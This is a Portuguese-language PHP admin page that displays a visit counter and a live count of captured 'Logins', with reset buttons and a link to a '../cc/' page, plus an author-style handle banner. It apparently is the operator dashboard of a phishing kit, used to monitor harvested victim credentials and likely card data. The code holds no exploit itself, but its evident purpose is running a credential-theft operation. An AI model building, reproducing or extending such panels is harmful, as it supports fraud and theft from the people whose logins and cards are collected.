<?php

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Painel de Administração</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://cdn.pixabay.com/photo/2017/08/30/01/05/milky-way-2695569_960_720.jpg'); /* Imagem de fundo */
      background-size: cover;
      background-position: center;
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 800px;
      margin: 50px auto;
      padding: 20px;
      background-color: rgba(255, 255, 255, 0.8); /* Cor de fundo semi-transparente */
      border-radius: 10px;
      box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
    }
    .panel {
      width: calc(50% - 10px); /* Largura de 50% da largura total da container, menos a margem */
      background-color: #f9f9f9;
      border: 1px solid #ddd;
      border-radius: 5px;
      padding: 20px;
      margin-bottom: 20px;
      box-sizing: border-box;
    }
    .panel-heading {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .panel-content {
      font-size: 18px;
      margin-bottom: 10px;
    }
    .button-zerar, .button-ver, .button-sair {
      background-color: red;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-bottom: 10px;
      display: block;
      width: 100%; /* Botão ocupando a largura total */
    }
    .button-zerar:hover, .button-ver:hover, .button-sair:hover {
      background-color: darkred;
    }
    .button-ver {
      background-color: blue;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="panel">
      <div class="panel-heading">Visitas</div>
      <div class="panel-content" id="visitasCount">
        <?php
        // Apenas exibir o valor atual do contador de visitas
        $contador_file = '../viu.txt';
        if (file_exists($contador_file)) {
            $contador = (int)file_get_contents($contador_file);
            echo $contador . ' visitas<br><br>';
        } else {
            echo '0 visitas<br><br>';
        }
        ?>
      </div>
      <button class="button-zerar" onclick="zerarContador()">Zerar</button>
    </div>
    
    <div class="panel">
      <div class="panel-heading">Logins</div>
      <div class="panel-content" id="infosContent">
        <?php
        $continfo_file = '../continfo.txt';
        if (file_exists($continfo_file)) {
            echo file_get_contents($continfo_file) . ' infos';
        } else {
            echo '0 infos';
        }
        ?>
      </div>
      <button class="button-zerar" onclick="zerarInfos()">Zerar</button>
      <button class="button-ver" onclick="verInfos()">Ver Logins</button>
    </div>
  </div>
  
  <h1 style="text-align: center; font-size: 30px; color: #fff;" class="blink">@TXT_JPGI1 <==</h1>

  <script>
    function atualizarContador() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          document.getElementById("visitasCount").innerHTML = this.responseText + ' visitas';
        }
      };
      xhttp.open("GET", "../viu.txt", true);
      xhttp.send();
    }

    function zerarContador() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          atualizarContador(); // Atualiza o contador após zerar
        }
      };
      xhttp.open("GET", "zerar_contador.php", true);
      xhttp.send();
    }

    function atualizarInfos() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          document.getElementById("infosContent").innerHTML = this.responseText + ' infos';
        }
      };
      xhttp.open("GET", "./continfo.txt", true);
      xhttp.send();
    }

    function zerarInfos() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          atualizarInfos(); // Atualiza as infos após zerar
        }
      };
      xhttp.open("GET", "zerar_infos.php", true);
      xhttp.send();
    }

    function verInfos() {
      window.location.href = "../cc/index.php";
    }

    // Atualizar o contador e as infos a cada 2 segundos
    setInterval(function() {
      atualizarContador();
      atualizarInfos();
    }, 2000);
  </script>
</body>
</html>
